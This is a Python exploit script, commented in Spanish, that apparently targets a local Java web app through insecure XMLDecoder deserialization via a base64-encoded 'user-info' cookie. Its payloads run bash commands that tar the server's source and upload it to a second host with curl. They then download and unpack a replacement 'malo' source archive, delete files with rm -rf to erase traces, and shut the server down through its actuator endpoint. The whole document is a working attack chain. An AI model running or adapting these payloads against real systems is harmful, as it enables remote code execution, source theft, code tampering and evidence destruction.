import requests
import base64


URL: str = "http://localhost:8888/"


PAYLOAD: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>/bin/bash</string>
    </void>
    <void index="1">
     <string>-c</string>
    </void>
    <void index="2">
     <string>curl -X GET http://localhost:1234/download -o src_malo.tar.gz</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""



PAYLOAD2: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>/bin/bash</string>
    </void>
    <void index="1">
     <string>-c</string>
    </void>
    <void index="2">
     <string>tar -czvf src.tar.gz src</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""

PAYLOAD3: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>/bin/bash</string>
    </void>
    <void index="1">
     <string>-c</string>
    </void>
    <void index="2">
     <string>curl -X POST http://localhost:1234/source -F 'file=@src.tar.gz'</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""

PAYLOAD4: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>/bin/bash</string>
    </void>
    <void index="1">
     <string>-c</string>
    </void>
    <void index="2">
     <string>tar -xvzf src_malo.tar.gz</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""

PAYLOAD5: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>/bin/bash</string>
    </void>
    <void index="1">
     <string>-c</string>
    </void>
    <void index="2">
     <string>curl -X POST http://localhost:8888/actuator/shutdown</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""


PAYLOAD6: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>/bin/bash</string>
    </void>
    <void index="1">
     <string>-c</string>
    </void>
    <void index="2">
     <string>rm -rf target src_malo.tar.gz src.tar.gz</string>
    </void>
   </array>
  </void>
 </object>
</java>
"""





##### COMPRIMO EL SRC ######
PAYLOAD2 = PAYLOAD2.strip()


encoded_payload = base64.b64encode(PAYLOAD2.encode()).decode()


response = requests.get(URL, cookies={
    'user-info': encoded_payload
})

print("Response Status Code:", response.status_code)
print("Response Text:", response.text)


##### ENVIO AL SERVIDOR MIO EL SRC ######

PAYLOAD3 = PAYLOAD3.strip()


encoded_payload = base64.b64encode(PAYLOAD3.encode()).decode()

response = requests.get(URL, cookies={
    'user-info': encoded_payload
})


print("Response Status Code:", response.status_code)
print("Response Text:", response.text)



##### ENVIA AL SERVIDOR UNA PETICION PARA QUE LE PASE EL NUEVO CODIGO SRC ######
PAYLOAD = PAYLOAD.strip()


encoded_payload = base64.b64encode(PAYLOAD.encode()).decode()


response = requests.get(URL, cookies={
    'user-info': encoded_payload
})

print("Response Status Code:", response.status_code)
print("Response Text:", response.text)



##### DESCOMPRIMO EL SRC ######
PAYLOAD4 = PAYLOAD4.strip()

encoded_payload = base64.b64encode(PAYLOAD4.encode()).decode()


response = requests.get(URL, cookies={
    'user-info': encoded_payload
})


print("Response Status Code:", response.status_code)
print("Response Text:", response.text)


##### ELIMINAMOS RASTRO ######
PAYLOAD6 = PAYLOAD6.strip()

encoded_payload = base64.b64encode(PAYLOAD6.encode()).decode()
response = requests.get(URL, cookies={
    'user-info': encoded_payload
})

print("Response Status Code:", response.status_code)
print("Response Text:", response.text)



##### APAGO EL SERVIDOR ######
PAYLOAD5 = PAYLOAD5.strip()


encoded_payload = base64.b64encode(PAYLOAD5.encode()).decode()

response = requests.get(URL, cookies={
    'user-info': encoded_payload
})

print("Response Status Code:", response.status_code)
print("Response Text:", response.text)


